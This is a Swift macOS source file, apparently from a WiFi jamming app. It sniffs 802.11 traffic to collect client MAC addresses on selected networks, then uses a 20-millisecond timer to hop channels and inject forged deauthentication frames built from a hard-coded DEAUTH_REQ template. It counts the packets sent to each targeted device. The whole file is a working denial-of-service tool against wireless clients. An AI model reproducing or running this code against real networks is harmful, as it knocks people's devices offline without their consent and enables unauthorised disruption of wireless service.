


import Foundation
import AppKit


//#define DEAUTH_REQ \
//	"\xC0\x00"                  /* Type: Management Subtype: Deauthentication  */ \
//	"\x3C\x00"                  /* Duration */ \
//	"\xCC\xCC\xCC\xCC\xCC\xCC"  /* Destination MAC Address */ \
//	"\xBB\xBB\xBB\xBB\xBB\xBB"  /* Transmitter MAC Address */ \
//	"\xBB\xBB\xBB\xBB\xBB\xBB"  /* BSSID */\
//	"\x00\x00"                  /* Sequence Number */\
//	"\x01\x00"                  /* Unspecified reason */

let DEAUTH_REQ: [UInt8] = [
	0xC0,0x00,                        /* Type: Management Subtype: Deauthentication  */
	0x3C,0x00,                        /* Duration */
	0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,    /* Destination MAC Address */
	0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,    /* Transmitter MAC Address */
	0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,    /* BSSID */
	0x00,0x00,                        /* Sequence Number */
	0x01,0x00]                        /* Unspecified reason */


//let DEAUTH_REQ =
//"\\xC0\\x00\\x3A\\x01\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\x00\\x00\\x07\\x00"


class JWClientKiller: NSView, ANWiFiSnifferDelegate, NSTableViewDelegate, NSTableViewDataSource {
	var clients: [JWClient] = []
	var channels: [CWChannel] = []
	var networksForChannel: [CWChannel : [CWNetwork]] = [:]
	var channelIndex = 0
	var sniffer: ANWiFiSniffer?
	var jamTimer: Timer?
	var infoTable: NSTableView?
	var infoScrollView: NSScrollView?
	var backButton: NSButton?
	var doneButton: NSButton?
	var newClientsCheck: NSButton?

	var sortAscending = true
	var sortOrder = ""
	

	init(frame: NSRect, sniffer theSniffer: ANWiFiSniffer?, networks: [CWNetwork]?, clients theClients: [JWClient]?) {
		super.init(frame: frame)
		clients = theClients ?? []
		sniffer = theSniffer
		sniffer?.delegate = self
		sniffer?.start()
		
		var mChannels: [CWChannel] = []
		for net in networks ?? [] {
			if let wlanChannel = net.wlanChannel {
				if !mChannels.contains(wlanChannel) {
					mChannels.append(wlanChannel)
				}
			}
		}
		
		
		channels = mChannels
		channelIndex = -1
		
		var mNetworksPerChannel: [CWChannel : [CWNetwork]] = [:]
		for channel in channels {
			var mNetworks: [CWNetwork] = []
			for network in networks ?? [] {
				if network.wlanChannel?.isEqual(to: channel) ?? false {
					mNetworks.append(network)
				}
			}
			
			
			mNetworksPerChannel[channel] = mNetworks
		}
		networksForChannel = mNetworksPerChannel
		
		jamTimer = Timer.scheduledTimer(timeInterval: 0.02, target: self, selector: #selector(performNextRound), userInfo: nil, repeats: true)
		performNextRound()
		
		configureUI()
	}
	
	required init?(coder decoder: NSCoder) {
		super.init(coder: decoder)
		//fatalError("init(coder:) has not been implemented")
	}
	
	func configureUI() {
		let frame = bounds
		infoScrollView = NSScrollView(frame: NSRect(x: 10, y: 52, width: frame.size.width - 20, height: frame.size.height - 62))
		infoTable = NSTableView(frame: infoScrollView!.contentView.bounds)
		doneButton = NSButton(frame: NSRect(x: frame.size.width - 110, y: 10, width: 100, height: 24))
		backButton = NSButton(frame: NSRect(x: frame.size.width - 210, y: 10, width: 100, height: 24))
		newClientsCheck = NSButton(frame: NSRect(x: 10, y: 10, width: 200, height: 24))
		
		newClientsCheck?.setButtonType(.switch)
		newClientsCheck?.bezelStyle = .rounded
		newClientsCheck?.title = "Actively scan for clients"
		newClientsCheck?.state = .init(1)
		
		backButton?.bezelStyle = .rounded
		backButton?.title = "Back"
		backButton?.font = .systemFont(ofSize: 13)
		backButton?.target = self
		backButton?.action = #selector(backButton(_:))
		
		doneButton?.bezelStyle = .rounded
		doneButton?.title = "Done"
		doneButton?.font = .systemFont(ofSize: 13)
		doneButton?.target = self
		doneButton?.action = #selector(doneButton(_:))
		
		let enabledColumn = NSTableColumn(identifier: NSUserInterfaceItemIdentifier("enabled"))
		enabledColumn.headerCell.stringValue = "Jam"
		enabledColumn.width = 30
		enabledColumn.isEditable = true
		enabledColumn.sortDescriptorPrototype = NSSortDescriptor(key: enabledColumn.identifier.rawValue, ascending: true)
		infoTable?.addTableColumn(enabledColumn)
		
		let deviceColumn = NSTableColumn(identifier: NSUserInterfaceItemIdentifier("device"))
		deviceColumn.headerCell.stringValue = "Device"
		deviceColumn.width = 120
		deviceColumn.isEditable = false
		deviceColumn.sortDescriptorPrototype = NSSortDescriptor(key: deviceColumn.identifier.rawValue, ascending: true)
		infoTable?.addTableColumn(deviceColumn)
		
		let deauthsColumn = NSTableColumn(identifier: NSUserInterfaceItemIdentifier("count"))
		deauthsColumn.headerCell.stringValue = "Deauths"
		deauthsColumn.width = 120
		deauthsColumn.isEditable = false
		deauthsColumn.sortDescriptorPrototype = NSSortDescriptor(key: deauthsColumn.identifier.rawValue, ascending: true)
		infoTable?.addTableColumn(deauthsColumn)
		
		infoScrollView?.documentView = infoTable
		infoScrollView?.borderType = .bezelBorder
		infoScrollView?.hasVerticalScroller = true
		infoScrollView?.hasHorizontalScroller = true
		infoScrollView?.autohidesScrollers = false
		
		infoTable?.dataSource = self
		infoTable?.delegate = self
		infoTable?.allowsMultipleSelection = true
		
		if let _ = infoScrollView { addSubview(infoScrollView!) }
		if let _ = backButton { addSubview(backButton!) }
		if let _ = doneButton { addSubview(doneButton!) }
		if let _ = newClientsCheck { addSubview(newClientsCheck!) }
		
		autoresizesSubviews = true
		autoresizingMask = [.width, .height]
		infoScrollView?.autoresizingMask = [.width, .height]
		doneButton?.autoresizingMask = .minXMargin
		backButton?.autoresizingMask = .minXMargin
	}
	
	// MARK: - Events -
	
	@objc func backButton(_ sender: Any?) {
		jamTimer?.invalidate()
		jamTimer = nil
		sniffer?.delegate = nil
		var networks: [CWNetwork] = []
		for networkArr in networksForChannel.values {
			networkArr.forEach { networks.append($0) }
		}
		
		let gatherer = JWTrafficGatherer(frame: bounds, sniffer: sniffer, networks: networks)
		(NSApp.delegate as? JWAppDelegate)?.push(gatherer, direction: .backward)
	}
	
	@objc func doneButton(_ sender: Any?) {
		jamTimer?.invalidate()
		jamTimer = nil
		sniffer?.stop()
		sniffer?.delegate = nil
		sniffer = nil
		(NSApp.delegate as? JWAppDelegate)?.showNetworkList()
	}
	
	// MARK: - Table View -
	func numberOfRows(in tableView: NSTableView) -> Int {
		return clients.count
	}
	
	func tableView(_ tableView: NSTableView, objectValueFor tableColumn: NSTableColumn?, row: Int) -> Any? {
		let client = clients[row]
		if (tableColumn?.identifier == NSUserInterfaceItemIdentifier("device")) {
			return MACToString(client.macAddress)
		} else if (tableColumn?.identifier == NSUserInterfaceItemIdentifier("count")) {
			return NSNumber(value: client.deauthsSent)
		} else if (tableColumn?.identifier == NSUserInterfaceItemIdentifier("enabled")) {
			return NSNumber(value: client.enabled)
		}
		return nil
	}
	
	func tableView(_ tableView: NSTableView, dataCellFor tableColumn: NSTableColumn?, row: Int) -> NSCell? {
		if (tableColumn?.identifier == NSUserInterfaceItemIdentifier("enabled")) {
			let cell = NSButtonCell()
			cell.setButtonType(.switch)
			cell.title = ""
			return cell
		}
		return nil
	}
	
	func tableView(_ tableView: NSTableView, setObjectValue object: Any?, for tableColumn: NSTableColumn?, row: Int) {
		let client = clients[row]
		if (tableColumn?.identifier == NSUserInterfaceItemIdentifier("enabled")) {
			client.enabled = (object as? NSNumber)?.boolValue ?? false
		}
	}
	
	func tableView(_ tableView: NSTableView, sortDescriptorsDidChange oldDescriptors: [NSSortDescriptor]) {
		
		guard let sortDescriptor = tableView.sortDescriptors.first else {
		   return
		 }
		
		sortAscending = sortDescriptor.ascending
		sortOrder = sortDescriptor.key!
		sortNetworks()
		infoTable?.reloadData()
	}
	
	@inline(__always) func sortNetworks() {
		if sortOrder == "" { return }
		
		let order: ComparisonResult = sortAscending ? .orderedAscending : .orderedDescending

		switch sortOrder {
			case "enabled": clients.sort { $0.enabled.description.localizedStandardCompare($1.enabled.description) == order}; break
			case "device": clients.sort { MACToString($0.macAddress).localizedStandardCompare(MACToString($1.macAddress)) == order}; break
			case "count": clients.sort { String($0.packetCount).localizedStandardCompare(String($1.packetCount)) == order}; break
			default: break
		}
	}
	
	// MARK: - Deauthing -
	
	@objc func performNextRound() {
		channelIndex += 1
		if channelIndex >= channels.count {
			channelIndex = 0
		}
		let channel : CWChannel? = channels[channelIndex]
		sniffer?.setChannel(channel)
		// deauth all clients on all networks on this channel
		var networks: [CWNetwork]? = nil
		if let channel = channel {
			networks = networksForChannel[channel]
		}
		for client in clients {
			if !client.enabled {
				continue
			}
			for network in networks ?? [] {
				var bssid = [UInt8](repeating: 0, count: 6)
				copyMAC(network.bssid, &bssid)
				let packet = deauthPacket(forBSSID: bssid, client: client.macAddress)
				sniffer?.write(packet)
				client.deauthsSent += 1
			}
		}
//		sortNetworks()
		infoTable?.reloadData()
	}
	
	func deauthPacket(forBSSID bssid: UnsafePointer<UInt8>?, client: UnsafePointer<UInt8>?) -> AN80211Packet? {
		var deauth = [CChar](repeating: 0, count: 26)

		memcpy(&deauth[0], DEAUTH_REQ, 26)
		memcpy(&deauth[4], client, 6)
		memcpy(&deauth[10], bssid, 6)
		memcpy(&deauth[16], bssid, 6)
		
		let packet = AN80211Packet(data: Data(bytes: deauth, count: 26))
		return packet
	}
	
	func includesBSSID(_ bssid: UnsafePointer<UInt8>?) -> Bool {
		for key in networksForChannel {
			for network in key.value {
				if (MACToString(bssid) == network.bssid) {
					return true
				}
			}
		}
		return false
	}
	
	// MARK: - WiFi Sniffer -
	func wifiSniffer(_ sniffer: ANWiFiSniffer?, gotPacket packet: AN80211Packet?) {
		if (newClientsCheck?.state == nil) {
			return
		}
		var hasClient = false
		var client = [CUnsignedChar](repeating: 0, count: 6)
		var bssid = [CUnsignedChar](repeating: 0, count: 6)
		if packet?.dataFCS() != packet?.calculateFCS() {
			return
		}
		if packet?.macHeader().pointee.frame_control.from_ds == 0 && packet?.macHeader().pointee.frame_control.to_ds == 1 {
			//withUnsafePointer(to: packet?.macHeader().pointee.mac1) { memcpy(&bssid, $0, 6) }
				//bssid = withUnsafePointer(to: packet?.macHeader().pointee.mac1) {
				//	$0.withMemoryRebound(to: CUnsignedChar.self, capacity: 6) {
				//		Array(UnsafeBufferPointer(start: $0, count: 6))
				//	}
				//}
			bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac1) {
				Array($0.bindMemory(to: CUnsignedChar.self))
			}
			
			if !includesBSSID(bssid) { return }
			client = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) {
				Array($0.bindMemory(to: CUnsignedChar.self))
			}
			hasClient = true
		} else if packet?.macHeader().pointee.frame_control.from_ds == 0 && packet?.macHeader().pointee.frame_control.to_ds == 0 {
			bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac3) {
				Array($0.bindMemory(to: CUnsignedChar.self))
			}
			if !includesBSSID(bssid) {
				return
			}
			if memcmp(withUnsafeBytes(of: packet?.macHeader().pointee.mac2){$0.baseAddress!}, withUnsafeBytes(of: packet?.macHeader().pointee.mac3){$0.baseAddress!}, 6) != 0 {
				client = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) {
					Array($0.bindMemory(to: CUnsignedChar.self))
				}
				hasClient = true
			}
		} else if packet?.macHeader().pointee.frame_control.from_ds == 1 && packet?.macHeader().pointee.frame_control.to_ds == 0 {
			bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) {
				Array($0.bindMemory(to: CUnsignedChar.self))
			}
			if !includesBSSID(bssid) {
				return
			}
			client = withUnsafeBytes(of: packet?.macHeader().pointee.mac1) {
				Array($0.bindMemory(to: CUnsignedChar.self))
			}
			hasClient = true
		}
		if client[0] == 0x33 && client[1] == 0x33 {
			hasClient = false
		}
		if client[0] == 0x01 && client[1] == 0x00 {
			hasClient = false
		}
		if client[0] == 0xff && client[1] == 0xff {
			hasClient = false
		}
		if client[0] == 0x03 && client[5] == 0x01 {
			hasClient = false
		}
		if hasClient {
			let clientObj = JWClient(mac: client, bssid: bssid)
			var containsClient = false
			for aClient in clients {
				if memcmp(aClient.macAddress, clientObj.macAddress, 6) == 0 {
					containsClient = true
					break
				}
			}
			if !containsClient {
				clients.append(clientObj)
//				sortNetworks()
				infoTable?.reloadData()
			}
		}
	}
	
	func wifiSniffer(_ sniffer: ANWiFiSniffer?, failedWithError error: Error?) {
		if let error = error {
			print("Got error: \(error)")
		}
	}
	
	func wifiSnifferFailed(toOpenInterface sniffer: ANWiFiSniffer?) {
		print("Couldn't open interface")
	}

}
